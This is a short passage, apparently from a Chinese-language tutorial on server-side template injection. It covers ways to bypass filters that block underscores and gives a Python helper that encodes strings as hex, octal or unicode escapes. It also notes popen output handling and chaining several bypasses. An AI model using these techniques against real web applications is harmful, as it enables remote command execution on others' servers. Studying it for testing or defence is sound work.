_绕过

绕过的思路大同小异，一种是通过编码绕过，一种是造出，毕竟前面我们已经能造出任何字符了，当然也可以通过其它形式来造出_ ，因为下划线相对于引号还是出现的比较频繁的，还有一种也是request的形式，通过request得到_

  1. 编码绕过
# 转十六进制
def tohex(string):
    for i in string:
        print("\\x{:0x}".format(ord(i)), end="")
    print()


# 转八进制
def tooct(string):
    for i in string:
        print("\\{:0o}".format(ord(i)), end="")
    print()


# 转unicode
def touni(string):
    for i in string:
        print("\\u00{:0x}".format(ord(i)), end="")
    print()


string1 = "" #要编码的字符串
tohex(string1)
tooct(string1)
touni(string1)

注意事项

  1. 环境差异：子类索引号会随Python版本变化
  2. 输出处理：popen返回对象需使用.read()读取
  3. 上下文限制：部分对象在不同模板引擎中可用性不同
  4. 过滤绕过：可组合使用多种技术实现多层绕过
